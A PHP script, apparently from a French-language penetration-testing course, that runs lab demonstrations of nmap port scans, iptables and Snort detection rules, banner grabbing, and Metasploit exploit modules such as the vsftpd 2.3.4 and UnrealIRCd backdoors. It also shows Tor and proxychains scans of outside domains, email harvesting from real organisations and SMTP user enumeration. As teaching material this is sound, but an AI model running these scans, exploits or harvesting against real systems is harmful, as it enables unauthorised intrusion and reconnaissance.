		$this->remarque("on TCP on peut se permettre de scanner tous les ports mais pour UDP ? ");
		$this->article("UDP", "nmap -Pn -n -p1-65535 -vvv --reason <Cible>");
		$this->remarque("UDP trop long on doit limiter le nombre de ports");
		$this->article("UDP", "echo '$this->root_passwd' | sudo -S nmap -sU --top-ports 5 -Pn -n -p1-65535 -vvv --reason <Cible>");
	
		// ##################### Contre Mesures de SCAN #################################
		$this->titre("0x031400 Countermeasure SCAN SYN+TCP in Firewall");
		ssh($this->msf, "root", "rohff", 'iptables -F;iptables -X');
		$this->pause();
		$this->article("TCP", "Open scan techniques are too easy to detect and filter.
This type of scan method involves opening a full connection to the remote computer using TCP / IP agreement in three classic stages");
		$this->pause();
		$this->ssTitre("Scanning TCP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sS -p 21,22,23,25,53,80,81,137,139,445 -r --open --reason -e $this->eth_lan $this->msf -oX $this->dir_tmp/scan_tcp_no_fw.xml | egrep \"hack|tcp\"");
		$this->pause();
		$this->ssTitre("Scanning UDP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sU -p 53,137,139 -r --open --reason -e $this->eth_lan $this->msf -oX $this->dir_tmp/scan_udp_no_fw.xml | egrep \"hack|udp\"");
		$this->pause();
		$iptables = "iptables -N synScan;iptables -A synScan -p TCP -m state --state NEW -m limit --limit 1/s --limit-burst 1 -j RETURN;iptables -A synScan -p TCP -j LOG --log-prefix \"ROHFF SYN SCAN Reject: \";iptables -A synScan -p TCP -j REJECT --reject-with tcp-reset;iptables -A INPUT -p TCP --syn -j synScan; iptables -N udpScan;iptables -A udpScan -p UDP -m state --state NEW -m limit --limit 1/s --limit-burst 1 -j RETURN;iptables -A udpScan -p UDP -j LOG --log-prefix \"ROHFF UDP SCAN Reject: \";iptables -A udpScan -p UDP -j REJECT --reject-with port-unreach;iptables -A INPUT -p UDP -j udpScan";
		ssh($this->msf, "root", "rohff", "$iptables");
		$this->pause();
		ssh($this->msf, "root", "rohff", 'iptables -L -nv');
		$this->pause();
		$this->ssTitre("Scanning TCP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sS -p 21,22,23,25,53,80,81,137,139,445 -r --reason -e $this->eth_lan $this->msf | egrep \"hack|tcp\"");
		$this->pause();
		$this->ssTitre("Scanning UDP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sU -p 53,137,139 -r --reason -e $this->eth_lan $this->msf | egrep \"hack|udp\"");
		$this->pause();
		$this->ssTitre("Countermeasure -> change Time for scanning -> 1 scan/2 second");
		$this->ssTitre("TCP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sS -p 21,22,23,25,53,80,81,137,139,445 --reason --open -r -e $this->eth_lan $this->msf --scan-delay 2 -oX $this->dir_tmp/scan_tcp_fw.xml | egrep \"hack|tcp\"");
		$this->pause();
		// requette("echo '$this->root_passwd' | sudo -S hping3 $this->msf --scan 21,22,23,25,53,80,81,137,139,445 --syn -I $this->eth_lan -V -i u2000000");pause();
		$this->ssTitre("UDP");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -Pn -n -sU -p 53,137,139 --reason --open -r -e $this->eth_lan $this->msf --scan-delay 2 -oX $this->dir_tmp/scan_udp_fw.xml | egrep \"hack|udp\"");
		$this->pause();
		$this->requette("ndiff $this->dir_tmp/scan_tcp_no_fw.xml $this->dir_tmp/scan_tcp_fw.xml");
		$this->requette("ndiff $this->dir_tmp/scan_udp_no_fw.xml $this->dir_tmp/scan_udp_fw.xml");
		$this->pause();
		ssh($this->msf, "root", "rohff", 'iptables -F;iptables -X');
		$this->pause();
		$this->note("To deceive the vigilance detection systems (NIDS/NIPS) and firewalls, scans can be done in a random order, with an excessively slow speed (eg several days), or from multiple IP addresses.");
	
	
	
	
		$this->titre("Using snort as NIDS to detect Port Scanning");
		$this->requette("ls /etc/snort/rules/*.rules");
		$this->pause();
		$this->requette("grep -i scan /etc/snort/rules/*.rules | grep -i nmap");
		$this->pause();
		$this->ssTitre("Countermeasure SCAN FIN/NULL/RST/URG/PUSH/XMAS/ECE/CWR");
		$this->ssTitre("SCAN FIN");
		$this->requette("grep -n 'SCAN FIN' /etc/snort/rules/scan.rules");
		$this->pause();
		$this->ssTitre("SCAN NULL");
		$this->requette("grep -n 'SCAN NULL' /etc/snort/rules/scan.rules");
		$this->pause();
		$this->ssTitre("SCAN XMAS");
		$this->requette("grep -n 'flags:FPU' /etc/snort/rules/scan.rules");
		$this->pause();
		$this->ssTitre("SCAN SYN/RST");
		$this->requette("grep -n 'SYN RST' /etc/snort/rules/emerging-scan.rules");
		$this->pause();
		$this->ssTitre("SCAN SYN/FIN");
		$this->requette("grep -n 'SCAN SYN FIN' /etc/snort/rules/scan.rules");
		$this->pause();
		$this->ssTitre("Snort Execution");
		$this->ssTitre("Debuging");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S snort -dev -i $eth_wan");
		$this->ssTitre("Displaying in console");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S snort -v -A console -c /etc/snort/snort.conf -i $this->eth_lan ");
		$this->ssTitre("Read PCAP");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S snort -v -A console -c /etc/snort/snort.conf -r $this->dir_tmp/snort_test.pcap");
		$this->ssTitre("Log");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S snort -dev -u snort -g snort -c /etc/snort/snort.conf -l /var/log/snort -A console -i $eth_wan -h 192.168.1.0/24 ");
		$this->pause();
	
		// Tcpdump –vttttnneli eth0 > tcpdump.log | usr/local/bin/tcpdump2csv.pl “sip dip dport” < tcpdump.log >sniff.csv Tcpdump2csv.pl
		// tshark -r traffic_sample.pcap -T fields -e ip.src -e ip.dst -e tcp.srcport ip.addr eq vex.honeynet.eg and tcp.flags eq 0x12 and tcp.srcport ne 80 | sort | uniq > tcp_flows.txt
		// tcpdump -vttttnneli eth0 | parsers/tcpdump2csv.pl "sip dip dport"
		// cat file.csv | perl afterglow.pl -c color.properties > file.dot
		// tshark -r file.pcap -e ip.dst -e ip.src -e tcp.srcport -T fields -E separator=, -R "tcp and tcp.flags.syn==1 and tcp.flags.ack==1" | sort | uniq > ipdst_ipsrc_tcpsrc.csv
		// tshark -r file.pcap -e ip.src -e ip.dst -e tcp.dport -T fields -E separator=, -R "tcp and tcp.flags.syn==1 and tcp.flags.ack==0" | sort | uniq > ipdst_ipsrc_tcpsrc.csv
		// mysql -s -u root -p | snort -e 'select ip_src
	
		/*
		 * IDMEF Intrusion Detection Message Exchange Format (IDMEF). The purpose of IDMEF is to define data formats and exchange procedures for sharing information of interest to intrusion detection and response systems and to the management systems that may need to interact with them. It is used in computer security for incidents reporting and exchanging. It is intended for easy automatic processing. Format details is described in the RFC 4765.
		*/
		// snort rules
		// alert icmp any any -> any any (icmp_id: 100; msg: "ICMP ID=100";)
		// alert icmp any any -> any any (icmp_seq: 100; msg: "ICMP Sequence=100";)
		// alert icmp any any -> any any (itype: 4; msg: "ICMP Source Quench Message received";)
		// alert icmp any any -> any any (itype: 5; icode: 1; msg: "ICMP ID=100";)
		// alert icmp any any -> any any (logto:logto_log; ttl: 100;)
		// alert tcp 192.168.1.0/24 any -> any 80 (msg: "Outgoing HTTP connection"; react: warn, msg;)
		// ping -n -r -b 255.255.255.255 -p "7569643d3028726f6f74290a" -c3
		// ping -n 1 -i 100 192.168.1.3 -> alert icmp any any -> any any (msg: "Rohff Ping with TTL=100"; ttl:100;)
		// snortsnarf.pl /var/log/snort/alert -d /var/www/html/snortsnarf
		// snortsnarf.pl user:passwd@dbname@host:port -d /var/www/html/snortsnarf
		// nmap --source-port 53 <IP>
		// nmap --badsum 10.10.1.41
		// sudo hping3 -I eth0 -c 1 --icmptype 8 --icmp-ipid 1337 onion.hack.vlan
		// ping -s 100 onion.hack.vlan
	
		// You can also display a particular type of data from the log file. The following command displays
		// all TCP type data from the log file: snort -dev -r / tmp/snort.log.1037840339 tcp
		// file /var/log/snort/snort.log.1037840514
		// tcpdump -r /tmp/snort.log.1037840514
		// alert tcp 192.168.1.0/24 any -> any 80 (msg: "Outgoing HTTP connection"; react: block;)
		// alert tcp 192.168.1.0/24 any -> any 80 (msg: "Outgoing HTTP connection"; react: warn, msg;)
		/*
		 * Snort to log to the Syslog daemon:
		* /opt/snort/bin/snort -c /opt/snort/etc/snort.conf -s
		* alert icmp any any -> any any (msg: "ICMP Packet found";)
		* alert tcp any 23 -> any any (content: "confidential"; msg: "Detected confidential";)
		* alert udp any any -> any any (msg: "UDP ports";)
		* alert tcp any any -> any 80 (content: "GET"; msg: "GET matched";)
		* alert ip any any -> 192.168.1.0/24 any (content-list: "porn"; msg: "Porn word matched";)
		* alert ip any any -> 192.168.1.0/24 any (dsize: > 6000; msg: "Large size IP packet detected";)
		* alert tcp any any -> 192.168.1.0/24 any (flags: SF; msg: "SYNC-FIN packet detected";)
		* ping -n 1 -f 192.168.1.2
		* alert icmp any any -> 192.168.1.0/24 any (fragbits: D; msg: "Don't Fragment bit set";)
		* rule will log all ICMP packets having TTL value equal to 100 to file logto_log
		* alert icmp any any -> any any (logto:logto_log; ttl: 100;)
		*
		* alert tcp any any -> 192.168.1.0/24 8080 (resp: rst_snd;)
		* rst_snd Sends a TCP Reset packet to the sender of the packet
		* rst_rcv Sends a TCP Reset packet to the receiver of the packet
		* rst_all Sends a TCP Reset packet to both sender and receiver
		* icmp_net Sends an ICMP Network Unreachable packet to sender
		* icmp_host Sends an ICMP Host Unreachable packet to sender
		* icmp_port Sends an ICMP Port Unreachable packet to sender
		* icmp_all Sends all of the above mentioned packets to sender
		* Alert tcp any any -> 192.168.1.0/24 80 (flags :A ;\content : “passwd”; msg: “detection de `passwd’ “ ;)
		* log tcp any any -> 192.168.1.0/24 110 (session: printable;)
		*
		* alert tcp !$HOME_NET any -> $HOME_NET 80 (msg: "IDS434 - WEB IIS - Unicode traversal backslash"; flags: AP; content: "..|25|c1|25|9c"; nocase;)
		* alert tcp !$HOME_NET any -> $HOME_NET 80 (msg: "IDS433 - WEB-IIS - Unicode traversal optyx"; flags: AP; content: "..|25|c0|25|af"; nocase;)
		* alert tcp !$HOME_NET any -> $HOME_NET 80 (msg: "IDS432 - WEB IIS - Unicode traversal"; flags: AP; content: "..|25|c1|25|1c"; nocase;)
		*
		*
		*/
	
		// snort.log.<Unix timestamp> -> snort.log.1360494635 ->
		// rohff@rohff-Compaq-610:~$ date --date='@1360494635'
		// dimanche 10 février 2013, 12:10:35 (UTC+0100)
	
		$this->ssTitre("Make Our custom snort rules");
		$this->requette("echo 'alert tcp any any -> any any (msg:\"Rohff SCAN FIN\"; flow:stateless; flags:F; sid:1000001;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN NULL\"; flow:stateless; flags:0; sid:1000002;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN XMAS\"; flow:stateless; flags:FPU; sid:1000003;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN SYN FIN\"; flow:stateless; flags:SF; sid:1000004;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN SYN RST\"; flow:stateless; flags:SR; sid:1000005;)\n
				alert tcp any any -> any any (msg:\"Rohff SCAN flag ALL\"; flow:stateless; flags:SFRPAUEC; sid:1000007;)\n' > $this->dir_tmp/rohff_scan.rules");
		$this->pause();
		$this->requette("gedit $this->dir_tmp/rohff_scan.rules");
		$this->pause();
	
	
	
		$snort = "echo '$this->root_passwd' | sudo -S nmap -Pn -n -sF -p 80 --reason -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n -sN -p 80 --reason  -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n -sX -p 80 --reason  -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n --scanflags SYNFIN -p 80 --reason  -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n --scanflags SYNRST -p 80 --reason  -e $this->eth_lan $this->msf;sleep 3s;sudo nmap -Pn -n --scanflags SYNFINRSTPSHACKURGECECWR -p 80 --reason  -e $this->eth_lan $this->msf";
		$cmd1 = "echo '$this->root_passwd' | sudo -S snort -c $this->dir_tmp/rohff_scan.rules -A console -i $this->eth_lan ";
		$cmd2 = $snort;
		$this->exec_parallel($cmd1, $cmd2, 1);
		$this->pause();
		$this->ssTitre("IP Fragmentation");
		$this->requette("grep 'SCAN NMAP -f -sF' /etc/snort/rules/*.rules");
		$this->pause();
		$this->cmd("localhost", "ipgrab -i $this->eth_lan");
		$this->requette("echo 'alert tcp any any -> any any (msg:\"Rohff SCAN Fragmentation IP\"; fragbits: R!;   sid:1000076;)' >> $this->dir_tmp/rohff_scan.rules");
		$this->pause();
		$cmd1 = "echo '$this->root_passwd' | sudo -S snort -c $this->dir_tmp/rohff_scan.rules -A console -i $this->eth_lan ";
		$cmd2 = "echo '$this->root_passwd' | sudo -S nmap -Pn -n -r -f -sF -p 80,81 --reason --packet-trace -vvv -e $this->eth_lan $this->msf ";
		$this->exec_parallel($cmd1, $cmd2, 1);
		$this->pause();
		$this->article("SYN SCAN IDS/IPS", "use honeypot (next Module Enumering Target) for Syn Scan to detect malware behavior (see Enum Service");
		$this->pause();
		$this->ssTitre("Snort rules Price");
		$this->net("http://www.snort.org/vrt/buy-a-subscription");
		$this->pause();
		$this->note("Build your own rules with the last Vulnerabilities by using honeypot to collect information about attack (vuln)");
		$this->pause();
	
	
		$this->notify("END Port SCANNING ");
	}
	
	
	
	
	public function poc4scan4ip4enum(){
	
		/*
		 * cat /proc/cpuinfo
		 * -sC \"discovery and auth and banner\"
		 *
		 * php Hack_04_Enumering.php | tee -a ../req4.txt
		 *
		 * $ php -r 'echo getprotobynumber(6);';echo
		 *
		 * http://thehackernews.com/2014/06/openssl-vulnerable-to-man-in-middle.html?utm_source=dlvr.it&utm_medium=linkedin
		 *
		 * http://securityaffairs.co/wordpress/25425/hacking/bypass-secure-boot-uefi.html
		 * snort sid > 1 million
		 * Detecting IDS :
		 * 1- by detecting prmomisouse mode interface
		 * http://www.nmrc.org/pub/review/antisniff-b2.html
		 *
		 * ftp://ftp.cerias.purdue.edu/pub/tools/unix/sysutils/ifstatus/
		 * http://www.securiteam.com/tools/2GUQ8QAQOU.html
		 * 2- sniffing -> alert traffic (make a alert with spoofing ip + mac -> ping of death)
		 * subSseven -> snort rules content: 0d0a5b52504c5d3030320d0a
		 *
		 * Intrusion detection system evasion techniques
		 * Obfuscating attack payload
		 * Fragmentation and small packets
		 * Denial of service
		 * honeybot -> statistique
		 *
		 */
		// #################################################################
		/*
		* cmd("localhost","echo '$this->root_passwd' | sudo -S p0f -i $this->eth_lan -V");pause();
		* //init_pentest($domain);
		* img("enum/enum_infrastructure.png");
		* ######################### PROTOCOLS #############################################
		* titre("0x040100 Protocols Scan");
		* net("http://www.iana.org/assignments/protocol-numbers/protocol-numbers.xml");pause();
		* // nstreams -l wlan0 : show traffic protocols known | sort | uniq
		* pause();
		* if(!file_exists("$this->dir_tmp/$domain.ip")) {important("make FIRST $domain.ip ->exp: for i in {10..25}; do echo \"10.50.10.\$i\" | tee -a $this->dir_tmp/$domain.ip ;done ");}
		* $cmd1 = "echo '$this->root_passwd' | sudo -S wireshark -i $this->eth_lan -k";
		* $cmd2 = "echo '$this->root_passwd' | sudo -S nmap -sO -vvv -n --stats-every 30s --reason -iL $this->dir_tmp/$domain.ip -oA $this->dir_tmp/$domain.ip.protocol";
		* $this->exec_parallel($cmd1, $cmd2, 3);
		* pause();
		* ##################################################################################
		*
		* Titre("Scanning Open Ports");
		* cmd("localhost","echo '$this->root_passwd' | sudo -S nmap -sS -p1-65535 -Pn -v --open $this->msf -oX $this->dir_tmp/$this->msf.port");
		* pause();
		*/
	
		titre("0x040200 Scan Services's version"); // --version-trace
		titre("Relation Ports <-> Services");
		net("http://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers");
		net("http://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xml");
		ssTitre("Scan Services's version: $domain");
		cmd("localhost"," nmap -sV --version-all -n --stats-every 30s -p 1-65535 --open -vvv -iL $this->dir_tmp/$domain.ip -oA $this->dir_tmp/$domain.port.vers");
		pause();
			
		$this->titre("Banner Grabing");
	
		$this->requette("echo 'salut tout le monde' > $this->dir_tmp/banner.txt");
		$this->cmd("localhost", "nc -lvnp 12345 <  $this->dir_tmp/banner.txt");
		$this->cmd("localhost", "nc localhost 12345 -v");
		$this->pause();
		$this->requette("echo 'quit ' | nc $this->msf 21 -v");
		$this->pause();
		$this->requette("nc $this->msf 3306 -v");
		$this->cmd("localhost", "mysql -h $this->msf -u root ");
		$this->pause();
		$this->cmd("localhost", "nc $this->msf 1524 -v");
		$this->pause();
		$this->article("Generer une erreur", "une page qui n'existe pas -> le but est de faire parler le serveur Web");
		$this->pause();
		$this->net("https://www.google.fr/search?hl=fr&q=intitle:\"error%20mysql\"");
		$this->pause();
		$this->requette("echo 'HEAD /index.html HTTP/1.1 \\r\\nHost: localhost \\r\\n\\n' | nc localhost 80 -v");
		$this->pause();
		$this->article("Purpose", "Make a mistake in order to make talk a web server");
		$this->pause();
		$this->requette("echo 'HEAD /* HTTP/1.1 \\r\\nHost: localhost \\r\\n\\n' | nc localhost 80 -v");
		$this->net("http://localhost/*");
		$this->pause();
		$this->net("http://nmap.org/book/man-nse.html");
		$this->requette(" nmap --script-updatedb");
		$this->pause();
		$this->requette("nautilus /usr/share/nmap/scripts/");
		$this->pause();
		$this->article("Nmap Scripts Categories", " all, auth, default, discovery, external, intrusive, malware, safe, vuln");
		$this->pause();
		$this->requette("nmap --script-help \"banner\" ");
		$this->pause();
		$this->requette("nmap --script-help \"discovery\" ");
		$this->pause();
		$this->requette("nmap --script-help \"auth\" ");
		$this->pause();
		$this->requette(" nmap  -vvv -p1-65535 --open -n --stats-every 20s -sC banner $this->msf -e $this->eth_lan ");
		$this->pause();
		$this->ssTitre("Advanced service enumeration and banner grabbing");
		$this->requette(" nmap  -vvv -p1-65535 --open -n --stats-every 20s -A $this->msf -e $this->eth_lan ");
		$this->pause();
		$this->article("Scan Services Version", "in order to make a good scan services version use -sC \"discovery and auth and banner\" eg: unreal IRC in metasploit in -sV we don't find a version but with script we get the version");
		$this->pause();
		$this->net("http://nmap.org/book/nse-usage.html");
	
		$this->ssTitre("Find VNC None Auth");
		$this->requette(" msfcli auxiliary/scanner/vnc/vnc_none_auth RHOSTS=$this->msf E");
		$this->cmd("localhost", "vncviewer <IP>");
		$this->pause();
		$this->ssTitre("Find X11 Servers");
		$this->requette(" msfcli auxiliary/scanner/x11/open_x11 RHOSTS=10.50.10.0/24 E");
		$this->cmd("localhost", "$this->dir_tools/sniff/xspy -display <IP>:0 -delay 100");
		$this->pause();
			
		$this->cmd("localhost", " nmap -sV --version-all -n --reason -vvv  --stats-every 20s -sC \"discovery and auth and banner\"  -e $this->eth_lan -p1-65535 --open -n -iL $this->dir_tmp/$domain.ip ");
		$this->pause();
		$this->ssTitre("Configure Metasploit");
		$this->net("http://fedoraproject.org/wiki/Metasploit_Postgres_Setup");
		$this->requette(" nmap --script smb-os-discovery.nse -p445 -Pn -n $this->xp $this->msf $this->owasp $this->win7 $win08 -e $this->eth_lan -Pn  -vvv");
		$this->pause();
		$this->requette(" msfcli auxiliary/scanner/smb/smb_version RHOSTS=\"$this->xp $this->msf $this->owasp $this->win7 $win08\"  E");
		$this->pause();
		$this->requette(" msfcli auxiliary/scanner/smtp/smtp_version RHOSTS=$this->msf E");
		$this->pause();
		$this->requette(" msfcli auxiliary/scanner/ftp/ftp_version RHOSTS=\"$this->msf $dsl\" E");
		$this->pause();
		$this->requette(" msfcli auxiliary/scanner/http/http_version RHOSTS=\"$dsl $this->msf $this->fw $dvl $this->owasp\" E");
		$this->pause();
		$this->requette(" msfcli auxiliary/scanner/ssh/ssh_version RHOSTS=\"$this->xp $dsl $this->msf $this->fw $dvl $this->owasp\" E");
		$this->pause();
		$this->requette(" msfcli auxiliary/scanner/mysql/mysql_version RHOSTS=\"$this->msf $dvl $this->owasp\" E");
		$this->pause();
		$this->requette(" msfcli auxiliary/scanner/telnet/telnet_version RHOSTS=$this->msf E");
		$this->pause();
		$query = "echo \"db_status\nsearch scanner\ninfo auxiliary/scanner/http/web_vulndb\nexit\n\" > $this->dir_tmp/search_scanner.rc; cat $this->dir_tmp/search_scanner.rc";
		$this->requette($query);
		$this->requette(" msfconsole -q -r $this->dir_tmp/search_scanner.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
		$this->pause();
		$this->article("TP", "SCAN VERSION FOR 10.50.10.170-200");
		$this->pause();
	
	
		// ########################## Version Services #######################################
		question("Quel est l'objectif du SCAN VERSIONS ?");
		$this->article("Objectif of Scan Version", " is to find exploit for software version");
		$this->pause();
		update_exploitdb ();
		$this->ssTitre("FTP Service ");
		exploitdb("vsftpd 2.3.4");
		$this->article("exemple", " for vsftpd 2.3.4 vulnerability found");
		$this->cmd("localhost", " msfcli exploit/unix/ftp/vsftpd_234_backdoor RHOST=$this->msf E");
		$this->pause();
		$query = " nmap -sC irc-find -Pn -vvv -p6667 $this->msf -n --reason -e $this->eth_lan";
		$this->requette($query);
		$this->pause();
		exploitdb("unreal linux 3.2.8.1");
		$this->cmd("localhost", " msfcli exploit/unix/irc/unreal_ircd_3281_backdoor RHOST=$this->msf E");
		$this->pause();
		/*
		 * exploitdb("postgresql");
		 * cmd("localhost"," msfcli auxiliary/scanner/postgres/postgres_version RHOSTS=$this->msf E");
		 * cmd("localhost"," msfcli exploit/linux/postgres/postgres_payload RHOST=$this->msf E");pause();
		 */
		$this->ssTitre("distccd");
		// Daemon user
		exploitdb("distcc");
		$this->net("http://www.delafond.org/traducmanfr/man/man1/distccd.1.html");
		$this->pause();
		$this->cmd("localhost", " msfcli exploit/unix/misc/distcc_exec RHOST=$this->msf E");
		$this->pause();
		$this->ssTitre("JAVA RMI");
		exploitdb("rmi");
		$this->cmd("localhost", " msfcli exploit/multi/misc/java_rmi_server RHOST=$this->msf TARGET=2 E");
		$this->pause();
		exploitdb("openssh");
		$this->ssTitre("Domain");
		$this->requette("dig @$this->msf version.bind txt chaos +short");
		$this->pause();
		exploitdb("bind");
		exploitdb("apache");
		exploitdb("proftpd");
		exploitdb("mysql");
		exploitdb("tightvnc");
		exploitdb("iis");
		exploitdb("windows 2008");
		// #################################################################################
	
		################### OS FINGER PRINTING ######################################
		/*
		* Nous allons changer quelques options de la couche TCP pour essayer de tromper les outils :
		*
		* D’abord, nous allons augmenter la valeur de ttl (ttl représente le TimeToLive ou la durée de vie du paquet). De 64, nous passons à 128 :
		*
		* echo 128 > /proc/sys/net/ipv4/ip_default_ttl
		*
		* Enfin nous allons désactiver deux options TCP :
		* echo 0 > /proc/sys/net/ipv4/tcp_window_scaling
		* echo 0 > /proc/sys/net/ipv4/tcp_timestamps
		*
		* p0f et xprobe2 seront ainsi trompé.
		* Attention, changer les options de la couche TCP peut avoir des conséquence sur les performances réseaux.
		*
		*
		*
		* /*
		* Nous allons changer quelques options de la couche TCP pour essayer de tromper les outils :
		* D’abord, nous allons augmenter la valeur de ttl (ttl représente le TimeToLive ou la durée de vie du paquet). De 64, nous passons à 128 :
		* echo 128 > /proc/sys/net/ipv4/ip_default_ttl
		* Enfin nous allons désactiver deux options TCP :
		* echo 0 > /proc/sys/net/ipv4/tcp_window_scaling
		* echo 0 > /proc/sys/net/ipv4/tcp_timestamps
		* p0f et xprobe2 seront ainsi trompé.
		* Attention, changer les options de la couche TCP peut avoir des conséquences sur les performances réseaux.
		*
		*/
		$domain = "hack.vlan";
		$this->chapitre("OS FINGERPRINTING");
		$this->titre("List of Operating Systems");
		$this->net("http://en.wikipedia.org/wiki/List_of_operating_systems");
		$this->pause();
		$this->ssTitre("ettercap");
		$this->requette("gedit /usr/share/ettercap/etter.finger.os");
		$this->pause();
		$this->ssTitre("Nmap");
		$this->net("http://nmap.org/misc/defeat-nmap-osdetect.html");
		$this->net("http://nmap.org/book/osdetect-fingerprint-format.html");
		$this->net("http://nmap.org/book/osdetect-methods.html");
		$this->net("https://svn.nmap.org/nmap/nmap-os-db");
		$this->pause();
		$this->requette("gedit `locate nmap-os-db`");
		$this->pause();
		$this->requette(" nmap -vvv --reason -O --osscan-guess --stats-every 30s -e $this->eth_lan -iL $this->dir_tmp/$domain.ip");
		$this->pause();
		$this->titre("Passive OS FINGERPRINTING");
		$this->ssTitre("By Sniffing LAN");
		$this->requette("grep 'ICMP PING' /etc/snort/rules/icmp-info.rules");
		$this->pause();
		gras("see p0f,lanmap2");
		$this->pause();
	
	
		// ########################## ANONYMAT ##########################################
		$this->todo("vpn gratuit freedom-ip ");
		$this->titre("Anonymat: proxychain, TOR");
		$domain = "www.gouvernement.fr";
		// $domain = "rafik3615.dyndns.org";
		$this->titre("Proxy Surf Anonyme");
		$this->net("http://hidemyass.com/proxy/");
		$this->net("http://anonymouse.org/anonwww.html");
		$this->net("http://translate.google.fr/ ");
		$this->pause();
		$this->net("http://www.readnotify.com");
		$this->net("http://www.yopmail.com/ ");
		$this->pause();
		$this->ssTitre("Using Tor Onion - Anonymity Network");
		$this->net("http://en.wikipedia.org/wiki/Tor_%28anonymity_network%29");
		$this->net("http://fr.wikipedia.org/wiki/Tor_%28r%C3%A9seau%29");
		$this->pause();
		$this->net("http://what-is-my-ip.net/?text");
		$this->net("http://ifconfig.me/ip");
		$this->pause();

	
		$this->img("enum/tor_onion.jpg");
		$this->pause();
		$this->net("https://www.torproject.org/");
		$this->pause();
		$this->ssTitre("Vidalia");
		$this->pause();
		$this->net("https://check.torproject.org");
		$this->pause();
		$this->net("http://what-is-my-ip.net/?text");
		$this->pause();
		// voir aussi torify
	
		// FIN 3day.txt
	
		$this->ssTitre("Without tor socket");
		$this->requette("curl http://ifconfig.me/ip");
		$this->requette("wget http://what-is-my-ip.net/?text -O $this->dir_tmp/ip_real.txt ; cat $this->dir_tmp/ip_real.txt;echo ");
		$this->pause();
		$this->ssTitre("Using usewithtor");
		$this->article("SSH", "usewithtor ssh login@host.tld ");
		$this->article("FTP", "usewithtor ftp login:pass@host.tld ");
		$this->article("SFTP", "usewithtor sftp login@host.tld ");
		$this->article("telnet", "usewithtor telnet host.tld ");
		$this->requette("usewithtor wget -qO- http://ifconfig.me/ip");
		$this->requette("usewithtor wget http://what-is-my-ip.net/?text -O $this->dir_tmp/ip_usewithtor.txt ; cat $this->dir_tmp/ip_usewithtor.txt;echo ");
		$this->ssTitre("Using torify");
		$this->requette("torify wget -qO- http://ifconfig.me/ip");
		$this->requette("torify wget http://what-is-my-ip.net/?text -O $this->dir_tmp/ip_torify.txt ; cat $this->dir_tmp/ip_torify.txt;echo ");
		$this->requette("man torify");
		$this->pause();
		$this->requette("usewithtor nmap -Pn -sT -r -n -p 21,22,23,25,53,80,143,443,465,587,993,995 www.mbis-inc.net -vvv --packet-trace --reason --stats-every 20s");
		$this->pause();
		$this->requette("torify nmap -Pn -sT -r -n -p 21,22,23,25,53,80,143,443,465,587,993,995 www.mbis-inc.net -vvv --packet-trace --reason --stats-every 20s");
		$this->pause();
	
		$this->ssTitre("Using ProxyChain");
		$this->net("http://proxychains.sourceforge.net");
		$this->note("Proxychains is configured by default to pass the connections through TOR network, noted that Tor passes only TCP connections ie you can not make it anonymous protocol which limits our field of action with Nmap.");
		$query = " proxychains nmap -Pn -sT -r -n -p 21,22,23,25,53,80,143,443,465,587,993,995 www.mbis-inc.net -vvv --packet-trace --reason --stats-every 20s";
		$this->requette($query);
		$this->important("ne fonctionne pas avec proxychain");
		$this->pause();
		###################################################################################
	
	
		###################################################################################
	
		$this->chapitre("Collecte Mails");
		$this->ssTitre("Metasploit -> google + yahoo + bing");
		$query = "echo  \"db_status\nuse gather/search_email_collector\nset DOMAIN mbis-inc.net\nset OUTFILE $this->dir_tmp/mbis-inc.net.mails\nshow options\nrun\nexit\n\" > $this->dir_tmp/search_smtp.rc; cat $this->dir_tmp/search_smtp.rc";
		system($query);
		$this->cmd("localhost", " msfconsole -q -r $this->dir_tmp/search_smtp.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
		$this->pause();
		$this->ssTitre("The hearvest");
		$this->requette("python $this->dir_tools/enum/theHarvester-master/theHarvester.py -h");
		$this->requette("python $this->dir_tools/enum/theHarvester-master/theHarvester.py -d bull.fr -l 500 -b google");
		$this->pause();
		$this->requette("python $this->dir_tools/enum/theHarvester-master/theHarvester.py -d microsoft -l 200 -b linkedin");
		$this->pause();
		$this->requette("python $this->dir_tools/enum/theHarvester-master/theHarvester.py -d mbis-inc.net -l 200 -b all");
		$this->pause();
		$this->titre("Sur le Serveur SMTP");
		$this->requette("echo 'vrfy root' | nc $this->msf 25 -v");
		$this->requette("echo 'vrfy rafik' | nc $this->msf 25 -v");
		$this->requette("echo 'vrfy msfadmin' | nc $this->msf 25 -v");
		$this->net("http://www.hobbesworld.com/telnet/smtp.php");
		$this->pause();
		$host = $this->msf;
		$port = 25;
		$this->ssTitre("dictionnary -> Comptes mails ");
		$port = 25;
		$this->requette("gedit /opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt");
		$mails = file("/opt/metasploit/apps/pro/msf3/data/wordlists/unix_users.txt");
		$fichier_log = "$this->dir_tmp/$host:$port.mails";
		$log = fopen($fichier_log, "w");
		$compteur = 0;
		$total = count($mails);
		foreach($mails as $mail) {
			$compteur ++;
			$mail = trim($mail);
			echo "\033[01;45m$compteur\033[0m/$total \033[01;33m" . $mail . "\033[0m@\033[01;34m$host\033[0m:$port  ";
			$head = vrfy($host, $port, $mail);
			if ($head == 250 || $head == 252) {
				echo "\033[01;41m$head \033[0m";
